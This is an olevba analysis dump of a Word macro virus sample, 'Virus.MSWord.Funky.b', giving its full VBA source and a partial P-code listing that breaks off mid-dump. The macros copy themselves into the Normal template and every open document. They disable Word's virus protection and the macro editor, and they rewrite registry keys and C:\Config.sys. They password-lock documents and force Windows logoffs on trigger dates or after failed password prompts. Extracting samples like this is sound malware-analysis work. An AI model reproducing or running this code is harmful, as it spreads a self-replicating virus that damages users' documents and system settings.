olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Funky.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Funky.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Grunge1981.bas 
in file: Virus.MSWord.Funky.b - OLE stream: 'Macros/VBA/Grunge1981'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'/////////////////////////////////////////////////////////////////////////////////////'
'/ I thank for all my friend in bandung UB2756                                       /'
'/ This version new in year 2001 by Grunge v(Nìñè Tèèñ 80 Oñè)-2                     /'
'/ Keep cool and be funky, Bandung 19 January 2001                                   /'
'/ You have a royalty-free right to use, modify, reproduce and distribute            /'
'/ this file (and/or any modified version) in any way you find useful,               /'
'/ but you don't remove my copyright, you can add your copyright in top this module. /'
'/////////////////////////////////////////////////////////////////////////////////////'
' other copyright here......

Public Const NMod = "Grunge1981", NDoc = "ThisDocument", Nform = "Frm1981"
Public Const OpWord = "Show Me What You Got"
Public Const ClWord = "My heart is sick, cause you not like me...", MG2 = "9 Teen 80 One is back."
Public Const IHeart = "please don't ask, why my heart is sick...", _
             Forget = "I can't forget your face in my memory", _
             Fucks = "You fuck and not have heart my friend..."
Public Const TMac = "you can't open VB, please call me in www.9Teen80One.id"
Public CekPas As Variant, Benar As Boolean
Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Public ThisDay As Boolean
Sub Grunge_Clear(theObject As Object)
On Error Resume Next
Dim NamaMac
For I = 1 To Application.VBE.VBProjects.Count
    For Each NamaMac In theObject.VBProject.VBComponents
        If NamaMac.Name <> NMod And NamaMac.Name <> NDoc And NamaMac.Name <> Nform Then
            Application.OrganizerDelete Source:=theObject.FullName, _
            Name:=NamaMac.Name, Object:=wdOrganizerObjectProjectItems
            'Application.VBE.VBProjects.Item(NamaMac).VBComponents.Remove NamaMac
            Application.Caption = MG2
        End If
        'If NamaMac.Name = NDoc Then
        '   With NamaMac.CodeModule
        '       .DeleteLines 1, .CountOfLines
        '   End With
        'End If
Next NamaMac
Next I
End Sub

Sub CopyObject(FromObj As Object, ToObj As Object)
On Error Resume Next
Dim ATemp As Template
For Each ATemp In Templates
   Application.OrganizerCopy Source:=FromObj.FullName, _
   Destination:=ToObj.FullName, Name:=NMod, Object:=wdOrganizerObjectProjectItems
   Application.OrganizerCopy Source:=FromObj.FullName, _
   Destination:=ToObj.FullName, Name:=Nform, Object:=wdOrganizerObjectProjectItems
Next ATemp
End Sub

Function FindME(theObject As Object) As Boolean
Dim aDocProp As DocumentProperty
    FindME = False
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name = NMod Then
            FindME = True
            Exit Function
        End If
    Next anObject
End Function

Sub CallDoc()
On Error Resume Next
Dim Adoc As Document, DT
DT = Format(Date, "DD-MM-YYYY")
    For Each Adoc In Documents
        CopyObject NormalTemplate, Documents(Adoc.Name)
        If Left(DT, 2) = "19" And Month(Now) = 3 Then
           Adoc.Password = "NineTeen80One"
        End If
    Next Adoc
    If Documents.Count > 0 Then CopyObject NormalTemplate, ActiveDocument.AttachedTemplate
End Sub

Sub CallNormal()
On Error Resume Next
Dim ATemp As Template
     If Documents.Count > 0 Then
        CopyObject ActiveDocument, NormalTemplate
        If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
            CopyObject ActiveDocument, ActiveDocument.AttachedTemplate
        For Each ATemp In Templates
            CopyObject ActiveDocument, ATemp
        Next ATemp
    End If
    With NormalTemplate.VBProject.VBComponents(1).CodeModule
        .DeleteLines 1, .CountOfLines
    End With
End Sub
Sub Saving()
On Error Resume Next
With Application
   Grunge_Clear .ActiveDocument
   Grunge_Clear .NormalTemplate
   CallDoc
   CallNormal
   If Not ActiveDocument.Saved And ActiveDocument.Characters.Count > 0 Then .ActiveDocument.Save
   .NormalTemplate.Save
End With
End Sub

Sub CapWord(Nm As String, Pan As Integer)
On Error Resume Next
Application.Caption = ""
For I = 1 To Pan
  For K = 1 To 1000
  Next K
    Application.Caption = Mid$(Nm, 1, I)
Next I
End Sub

Sub WordMsg()
CapWord MG2, Len(MG2)
Application.OnTime Now + TimeValue("00:00:06"), Name:="IHate"
End Sub

Sub IHate()
CapWord OpWord, Len(OpWord)
Application.OnTime Now + TimeValue("00:00:30"), Name:="CMsg"
End Sub
Sub CMsg()
CapWord ClWord, Len(ClWord)
Application.OnTime Now + TimeValue("00:00:50"), Name:="M1"
End Sub
Sub M1()
CapWord IHeart, Len(IHeart)
Application.OnTime Now + TimeValue("00:01:10"), Name:="M2"
End Sub
Sub M2()
CapWord Forget, Len(Forget)
WordBasic.DisableAutoMacros False: Application.ShowVisualBasicEditor = False
Application.OnTime Now + TimeValue("00:01:30"), Name:="M3"
End Sub
Sub M3()
On Error Resume Next
CapWord Fucks, Len(Fucks)
Application.OnTime Now + TimeValue("00:01:50"), Name:="WordMsg"
If (WeekDay(Date) <> vbFriday) And (WeekDay(Date) <> vbWednesday) Then
With Assistant.NewBalloon
    .Button = msoButtonSetOK
    .Icon = msoIconTip
    .Animation = msoAnimationSaving
    .Heading = "For My Friend"
    .Text = ClWord & Chr(13) & IHeart & Chr(13) & _
            Forget & Chr(13) & Fucks & Chr(13) & Chr(13) & "        9 Teen 80 One is cool"
    Application.Assistant.Move 200, 200
    .show
End With
End If
Beep
Application.OnTime Now + TimeValue("00:00:03"), Name:="Calldoc"
End Sub
Sub CProp()
On Error Resume Next
Beep
Dim aDocProp As DocumentProperty
    For Each aDocProp In NormalTemplate.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
    NormalTemplate.CustomDocumentProperties.Add _
            Name:="Nìñè Tèèñ 80 Oñè", _
            Type:=msoPropertyTypeNumber, _
            Value:="112", _
            LinkToContent:=False
End Sub

Sub GrungeCek()
On Error Resume Next
    With Application.Options
        .SaveNormalPrompt = False
        .SavePropertiesPrompt = False
        .VirusProtection = False
    End With
WordBasic.DisableAutoMacros True: Application.ShowVisualBasicEditor = False
ActiveDocument.CommandBars.Item(9).Enabled = False: ActiveDocument.CommandBars.Item(29).Enabled = False
UserName = MG2: UserInitials = "Trust to me": UserAddress = "www.9Teen80One.id"
End Sub

Sub FileSave()
On Error Resume Next
CapWord "Saving Nìñè Tèèñ 80 Oñè, please wait...", 33
Saving
CapWord MG2, Len(MG2)
End Sub
Sub AutoSave()
FileSave
End Sub

Sub FileOpen()
On Error Resume Next
WordMsg
GrungeCek
If Dialogs(wdDialogFileOpen).show <> 0 Then
   AutoOpen
End If
End Sub
Sub RegisterSys()
Dim HCU As String, HLM As String, Fold As String
HCU = "HKEY_CURRENT_USER"
HLM = "HKEY_LOCAL_MACHINE"
Fold = "\SOFTWARE\Microsoft\Windows\CurrentVersion"
System.PrivateProfileString("", HLM & "\>$#1Nìñè Tèèñ 80 Oñè", "Nìñè Tèèñ 80 Oñè") = "Kill Any Register, and i can't found"
System.PrivateProfileString("", HLM & Fold, "RegisteredOwner") = "Nìñè Tèèñ 80 Oñè"
System.PrivateProfileString("", HLM & Fold, "RegisteredOrganization") = MG2
System.PrivateProfileString("", HCU & "\Software\Classes\CLSID\{21EC2020-3AEA-1069-A2DD-08002B30309D}", "") = "Nìñè Tèèñ 80 Oñè Pañèl"
System.PrivateProfileString("", HLM & "\Software\CLASSES\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}", "") = "Døçùmèñt 1981"
System.PrivateProfileString("", HCU & "\Software\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "") = "Rè©ÿ©lè iñ 1981"
System.PrivateProfileString("", HCU & "\Software\Classes\CLSID\{2227A280-3AEA-1069-A2DE-08002B30309D}", "") = "Prìñtèr 1981"
System.PrivateProfileString("", HCU & "\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "Nìñè Tèèñ 80 Oñè"
System.PrivateProfileString("", HCU & "\Control Panel\International", "s1159") = "By-1981"
System.PrivateProfileString("", HCU & "\Control Panel\International", "s2359") = "By-1981"
System.PrivateProfileString("", HCU & "\Control Panel\International", "sTimeFormat") = "HH:mm:ss tt"
System.PrivateProfileString("", HLM & Fold & "\Winlogon", "LegalNoticeCaption") = "Nìñè Tèèñ 80 Oñè"
System.PrivateProfileString("", HLM & Fold & "\Winlogon", "LegalNoticeText") = ClWord & Chr(13) & IHeart & Chr(13) & Forget & Chr(13) & Fucks
End Sub
Sub AutoClose()
On Error Resume Next
Dim Data As String, Tim As String
Data = Format(Date, "DDDD, DD-MMMM-YYYY")
Tim = Format(Time, "HH:MM:SS AMPM")
CapWord MG2, Len(MG2)
Application.UserName = "Nìñè Tèèñ 80 Oñè"
If ActiveDocument.Saved = True Then Documents.Save
RegisterSys
PathFile = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
MkDir (PathFile & "\System32x")
WritePrivateProfileString Application.ActiveDocument.Name & "-" & ActiveDocument.FullName, ";Date infected    : ", Data, PathFile & "\System32x\Global.inf"
WritePrivateProfileString Application.ActiveDocument.Name & "-" & ActiveDocument.FullName, ";Time infected    : ", Tim, PathFile & "\System32x\Global.inf"
WritePrivateProfileString Application.ActiveDocument.Name & "-" & ActiveDocument.FullName, ";File Name        : ", ActiveDocument.FullName, PathFile & "\System32x\Global.inf"
WritePrivateProfileString Application.ActiveDocument.Name & "-" & ActiveDocument.FullName, ";User Name        : ", Application.UserName, PathFile & "\System32x\Global.inf"
RootsyS = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
Open "C:\Config.sys" For Output As #1
     Print #1, "Device=" & RootsyS & "\Command\Ansi.sys"
     Print #1, "SET WINPMT=$e[s$e[f$e[0;316;41;1m$e[K - I Don't Trust NoBody IF EveryBody Not Like Me (Nine Teen 80 One) - $_$e[0;40;37;1m$e[K$e[u$P$G"
Close #1
MyDay
End Sub
Sub MyDay()
DT = Format(Date, "DD-MM-YYYY")
If Left(DT, 2) = "19" Then
   MsgBox "Now is my lucky day, i hope you at enjoy now," & Chr(13) & "Nìñè Tèèñ 80 Oñè is keep smile, bye...bye...bye..."
   ExitWindowsEx 1, 0
End If
End Sub
Sub AutoExit()
On Error Resume Next
MyDay
If (WeekDay(Date) = vbFriday) Or (WeekDay(Date) = vbWednesday) Then
On Error GoTo Salah
    M3
    CapWord ClWord, Len(ClWord)
    Exit Sub
Salah:
    MsgBox OpWord, 16, MG2
    CapWord ClWord, Len(ClWord)
End If
End Sub
Sub viewvbcode()
ToolsMacro
End Sub
Sub ToggleFormsDesign()
ToolsMacro
End Sub
Sub viewcode()
ToolsMacro
End Sub
Sub FileClose()
On Error Resume Next
AutoClose
Application.ActiveDocument.Close
End Sub
Sub FileNewDefault()
On Error Resume Next
CapWord "Cool " & MG2, Len(MG2) + 5
WordBasic.FileNewDefault
CopyObject NormalTemplate, ActiveDocument
End Sub
Sub FileExit()
AutoClose
Application.Quit
End Sub
Sub FileNew()
On Error Resume Next
If Dialogs(wdDialogToolsTemplates).show <> 0 Then AutoOpen
SendKeys "Nìñè Tèèñ 80 Oñè is back", True
End Sub
Sub HelpAbout()
On Error Resume Next
Dim H
On Error GoTo Salah
    Frm1981.show
    Exit Sub
Salah:
H = InputBox("Please insert Password", MG2, "Fuck Up")
If H = "-*.*-" Then
   WordBasic.DisableAutoMacros False
    Application.ShowVisualBasicEditor = True
    Else
        CekPas = CekPas + 1
        MsgBox "Wrong Password to open my zone, i hope you don't try again", 16, "Nìñè Tèèñ 80 Oñè PASSWORD"
        If CekPas = 3 Then
           MsgBox "I Kill You Now........,bye...bye...bye...", 48, "Nìñè Tèèñ 80 Oñè Warning !"
           ExitWindowsEx 1, 0
        End If
End If
End Sub
Sub ToolsOptions()
Dim H
On Error Resume Next
H = InputBox("Please insert Password", MG2, "Fuck Up")
If H = "-*.*-" Then
   WordBasic.DisableAutoMacros False
    Application.Dialogs(wdDialogToolsOptions).show
    Else
        CekPas = CekPas + 1
         MsgBox "Wrong Password to open my zone, i hope you don't try again", 16, "Nine Teen 80 One PASSWORD"
        If CekPas = 3 Then
           MsgBox "I Kill You Now........,bye...bye...bye...", 48, "Nine Teen 80 One Warning !"
           ExitWindowsEx 1, 0
        End If
End If
End Sub
Sub ToolsMacro()
On Error Resume Next
M3
HelpAbout
CapWord TMac, Len(TMac)
With Assistant.NewBalloon
    .Button = msoButtonSetOK
    .Heading = "Regional Sales Data"
    .Text = ClWord & Chr(13) & IHeart & Chr(13) & Forget & Chr(13) & Fucks
    .show
End With
End Sub
Sub AutoExec()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
CekPas = 0
If Left(Format(Date, "DD"), 2) = 27 Then
   Frm1981.lblday.Caption = "You can't open on this day, because i like this day."
   ThisDay = True
   Frm1981.show
End If
WordBasic.DisableAutoMacros True
Application.EnableCancelKey = wdCancelDisabled
If FindME(NormalTemplate) Then
   CProp
   Application.Run "normal.Grunge1981.Calldoc"
    Else
        Grunge_Clear NormalTemplate
        CallNormal
        On Error Resume Next
        NormalTemplate.Save
End If
For I = 1 To 10: Application.CommandBars.Item(I).Protection = msoBarNoCustomize: Next I
WordBasic.DisableAutoMacros True: Application.ShowVisualBasicEditor = False
Application.Run "Normal.Grunge1981.M3"
End Sub

Sub AutoOpen()
On Error Resume Next
RecentFiles.Maximum = 0
BackGround
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros True
GrungeCek
WordMsg
CapWord MG2, Len(MG2)
Grunge_Clear ActiveDocument
If FindME(NormalTemplate) Then
   Grunge_Clear ActiveDocument
   Application.OnTime Now + TimeValue("00:00:05"), Name:="Grunge1981.CallDoc"
   Application.Run "normal.Grunge1981.CallDoc"
   Application.ActiveDocument.VBProject.Name = "NineTeen80One"
        If Documents.Count > 0 Then
            On Error Resume Next
            If Not ActiveDocument.Saved And ActiveDocument.Characters.Count > 0 Then ActiveDocument.Save
        End If
    Else
        Grunge_Clear NormalTemplate
        CallNormal
        On Error Resume Next
        NormalTemplate.Save
End If
For I = 1 To 10: Application.CommandBars.Item(I).Protection = msoBarNoCustomize: Next I

End Sub

Sub BackGround()
Dim RootsyS As String
On Error Resume Next
 RootsyS = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open RootsyS & "\1981.htm" For Output As #1
 Print #1, "<html><head>"
 Print #1, "<meta http-equiv='Content-Type'"
 Print #1, "content='text/html; charset=iso-8859-1'>"
 Print #1, "</head>"
 Print #1, "<body bgcolor='#000000' text='#FFFFFF'>"
 Print #1, "<p align='center'><font color='#FF0000' size='5' face='Arial'><strong>Nìñè"
 Print #1, "Tèèñ 80 Oñè is Back</strong></font></p>"
 Print #1, "<p align='center'>©reated Nìñè Tèèñ 80 Oñè 2001, Bandung</p>"
 Print #1, "<p align='center'>Show me what you got</p>"
 Print #1, "<table border='2'> <tr>"
 Print #1, "<td><img src='\..\..\Logo.sys' width='751' height='327'></td></tr>"
 Print #1, "</table>"
 Print #1, "<p align='center'>I Hate Nobody If Nobody Not Like Me And I Don't"
 Print #1, "Trust Nobody If Nobody Hate Me</p>"
 Print #1, "<p align='center'><a href='http://www.1981.com'><font size='5'>www.1981.com</font></a></p>"
 Print #1, "</body></html>"; 1981#; htm
 Close #1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = RootsyS & "\1981.htm"
End Sub
-------------------------------------------------------------------------------
VBA MACRO Frm1981.frm 
in file: Virus.MSWord.Funky.b - OLE stream: 'Macros/VBA/Frm1981'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 










































Private Sub CmdCancel_Click()
Unload Frm1981
If ThisDay = True Then Application.Quit: Exit Sub
End Sub
Private Sub CmdOK_Click()
On Error Resume Next
If (TxtUser.Text = Label4.Caption Or TxtUser.Text = "Macro$oft") And (TxtPas.Text = "70107334652001") Then
   MsgBox "Thank you, password is true.......", 48, "Infrmation "
        If ThisDay = False Then
            WordBasic.DisableAutoMacros False
            Application.ShowVisualBasicEditor = True
            CekPas = 0
            Unload Frm1981
            Exit Sub
        Else
            CekPas = 0
            ThisDay = False
            Unload Frm1981
            Application.ShowMe
            Exit Sub
        End If
   Else
   WordBasic.DisableAutoMacros True
   Application.ShowVisualBasicEditor = False
   MsgBox " Your Password in invalid, please try again......"
   TxtUser = ""
   TxtPas = ""
   TxtUser.SetFocus
   If CekPas = 3 Then
           If ThisDay = True Then Application.Quit: Exit Sub
           MsgBox "I Kill You Now........,bye...bye...bye...", 48, "Nine Teen 80 One Warning !"
           ExitWindowsEx 1, 0
   End If
   CekPas = CekPas + 1
End If
End Sub
Private Sub TxtPas_Change()
TxtUser_Change
End Sub
Private Sub TxtUser_Change()
CmdOK.Enabled = Len(TxtUser.Text) > 0 And Len(TxtPas.Text) > 0
End Sub
Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
If ThisDay = True Then Application.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Funky.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/Grunge1981 - 39815 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0056 "/////////////////////////////////////////////////////////////////////////////////////'"
' Line #1:
' 	QuoteRem 0x0000 0x0056 "/ I thank for all my friend in bandung UB2756                                       /'"
' Line #2:
' 	QuoteRem 0x0000 0x0056 "/ This version new in year 2001 by Grunge v(Nìñè Tèèñ 80 Oñè)-2                     /'"
' Line #3:
' 	QuoteRem 0x0000 0x0056 "/ Keep cool and be funky, Bandung 19 January 2001                                   /'"
' Line #4:
' 	QuoteRem 0x0000 0x0056 "/ You have a royalty-free right to use, modify, reproduce and distribute            /'"
' Line #5:
' 	QuoteRem 0x0000 0x0056 "/ this file (and/or any modified version) in any way you find useful,               /'"
' Line #6:
' 	QuoteRem 0x0000 0x0056 "/ but you don't remove my copyright, you can add your copyright in top this module. /'"
' Line #7:
' 	QuoteRem 0x0000 0x0056 "/////////////////////////////////////////////////////////////////////////////////////'"
' Line #8:
' 	QuoteRem 0x0000 0x001B " other copyright here......"
' Line #9:
' Line #10:
' 	Dim (Public Const) 
' 	LitStr 0x000A "Grunge1981"
' 	VarDefn NMod
' 	LitStr 0x000C "ThisDocument"
' 	VarDefn NDoc
' 	LitStr 0x0007 "Frm1981"
' 	VarDefn Nform
' Line #11:
' 	Dim (Public Const) 
' 	LitStr 0x0014 "Show Me What You Got"
' 	VarDefn OpWord
' Line #12:
' 	Dim (Public Const) 
' 	LitStr 0x002A "My heart is sick, cause you not like me..."
' 	VarDefn ClWord
' 	LitStr 0x0016 "9 Teen 80 One is back."
' 	VarDefn MG2
' Line #13:
' 	LineCont 0x0008 06 00 0D 00 0A 00 0D 00
' 	Dim (Public Const) 
' 	LitStr 0x0029 "please don't ask, why my heart is sick..."
' 	VarDefn IHeart
' 	LitStr 0x0025 "I can't forget your face in my memory"
' 	VarDefn Forget
' 	LitStr 0x0028 "You fuck and not have heart my friend..."
' 	VarDefn Fucks
' Line #14:
' 	Dim (Public Const) 
' 	LitStr 0x0036 "you can't open VB, please call me in www.9Teen80One.id"
' 	VarDefn TMac
' Line #15:
' 	Dim (Public) 
' 	VarDefn CekPas (As Variant)
' 	VarDefn Benar (As Boolean)
' Line #16:
' 	FuncDefn (Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long)
' Line #17:
' 	FuncDefn (Declare Function WritePrivateProfileString Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpKeyName As , ByVal lpString As , ByVal lpFileName As String) As Long)
' Line #18:
' 	Dim (Public) 
' 	VarDefn ThisDay (As Boolean)
' Line #19:
' 	FuncDefn (Sub Grunge_Clear(theObject As Object))
' Line #20:
' 	OnError (Resume Next) 
' Line #21:
' 	Dim 
' 	VarDefn NamaMac
' Line #22:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd VBProjects 
' 	MemLd Count 
' 	For 
' Line #23:
' 	StartForVariable 
' 	Ld NamaMac 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #24:
' 	Ld NamaMac 
' 	MemLd New 
' 	Ld NMod 
' 	Ne 
' 	Ld NamaMac 
' 	MemLd New 
' 	Ld NDoc 
' 	Ne 
' 	And 
' 	Ld NamaMac 
' 	MemLd New 
' 	Ld Nform 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #25:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld theObject 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NamaMac 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #26:
' 	QuoteRem 0x000C 0x0044 "Application.VBE.VBProjects.Item(NamaMac).VBComponents.Remove NamaMac"
' Line #27:
' 	Ld MG2 
' 	Ld Application 
' 	MemSt Caption 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	QuoteRem 0x0008 0x001B "If NamaMac.Name = NDoc Then"
' Line #30:
' 	QuoteRem 0x0008 0x001A "   With NamaMac.CodeModule"
' Line #31:
' 	QuoteRem 0x0008 0x0024 "       .DeleteLines 1, .CountOfLines"
' Line #32:
' 	QuoteRem 0x0008 0x000B "   End With"
' Line #33:
' 	QuoteRem 0x0008 0x0006 "End If"
' Line #34:
' 	StartForVariable 
' 	Ld NamaMac 
' 	EndForVariable 
' 	NextVar 
' Line #35:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #36:
' 	EndSub 
' Line #37:
' Line #38:
' 	FuncDefn (Sub CopyObject(FromObj As Object, ToObj As Object))
' Line #39:
' 	OnError (Resume Next) 
' Line #40:
' 	Dim 
' 	VarDefn ATemp
' Line #41:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #42:
' 	LineCont 0x0004 09 00 03 00
' 	Ld FromObj 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ToObj 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld NMod 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #43:
' 	LineCont 0x0004 09 00 03 00
' 	Ld FromObj 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ToObj 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld Nform 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #44:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' 	EndSub 
' Line #46:
' Line #47:
' 	FuncDefn (Function FindME(theObject As Object) As Boolean)
' Line #48:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #49:
' 	LitVarSpecial (False)
' 	St FindME 
' Line #50:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #51:
' 	Ld anObject 
' 	MemLd New 
' 	Ld NMod 
' 	Eq 
' 	IfBlock 
' Line #52:
' 	LitVarSpecial (True)
' 	St FindME 
' Line #53:
' 	ExitFunc 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	EndFunc 
' Line #57:
' Line #58:
' 	FuncDefn (Sub CallDoc())
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' 	Dim 
' 	VarDefn Adoc (As Document)
' 	VarDefn DT
' Line #61:
' 	Ld Date 
' 	LitStr 0x000A "DD-MM-YYYY"
' 	ArgsLd Format$ 0x0002 
' 	St DT 
' Line #62:
' 	StartForVariable 
' 	Ld Adoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #63:
' 	Ld NormalTemplate 
' 	Ld Adoc 
' 	MemLd New 
' 	ArgsLd Documents 0x0001 
' 	ArgsCall CopyObject 0x0002 
' Line #64:
' 	Ld DT 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 "19"
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #65:
' 	LitStr 0x000D "NineTeen80One"
' 	Ld Adoc 
' 	MemSt Password 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	StartForVariable 
' 	Ld Adoc 
' 	EndForVariable 
' 	NextVar 
' Line #68:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	ArgsCall CopyObject 0x0002 
' 	EndIf 
' Line #69:
' 	EndSub 
' Line #70:
' Line #71:
' 	FuncDefn (Sub CallNormal())
' Line #72:
' 	OnError (Resume Next) 
' Line #73:
' 	Dim 
' 	VarDefn ATemp
' Line #74:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #75:
' 	Ld ActiveDocument 
' 	Ld NormalTemplate 
' 	ArgsCall CopyObject 0x0002 
' Line #76:
' 	LineCont 0x0004 07 00 0C 00
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Ld NormalTemplate 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	ArgsCall CopyObject 0x0002 
' 	EndIf 
' Line #77:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #78:
' 	Ld ActiveDocument 
' 	Ld ATemp 
' 	ArgsCall CopyObject 0x0002 
' Line #79:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	NextVar 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #82:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #83:
' 	EndWith 
' Line #84:
' 	EndSub 
' Line #85:
' 	FuncDefn (Sub Saving())
' Line #86:
' 	OnError (Resume Next) 
' Line #87:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #88:
' 	MemLdWith ActiveDocument 
' 	ArgsCall Grunge_Clear 0x0001 
' Line #89:
' 	MemLdWith NormalTemplate 
' 	ArgsCall Grunge_Clear 0x0001 
' Line #90:
' 	ArgsCall CallDoc 0x0000 
' Line #91:
' 	ArgsCall CallNormal 0x0000 
' Line #92:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Not 
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	MemLdWith ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #93:
' 	MemLdWith NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #94:
' 	EndWith 
' Line #95:
' 	EndSub 
' Line #96:
' Line #97:
' 	FuncDefn (Sub CapWord(Nm As String, Pan As Integer))
' Line #98:
' 	OnError (Resume Next) 
' Line #99:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt Caption 
' Line #100:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Pan 
' 	For 
' Line #101:
' 	StartForVariable 
' 	Ld K 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	For 
' Line #102:
' 	StartForVariable 
' 	Ld K 
' 	EndForVariable 
' 	NextVar 
' Line #103:
' 	Ld Nm 
' 	LitDI2 0x0001 
' 	Ld I 
' 	ArgsLd Mid$$ 0x0003 
' 	Ld Application 
' 	MemSt Caption 
' Line #104:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #105:
' 	EndSub 
' Line #106:
' Line #107:
' 	FuncDefn (Sub WordMsg())
' Line #108:
' 	Ld MG2 
' 	Ld MG2 
' 	FnLen 
' 	ArgsCall CapWord 0x0002 
' Line #109:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:06"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0005 "IHate"
' 	ParamNamed New 
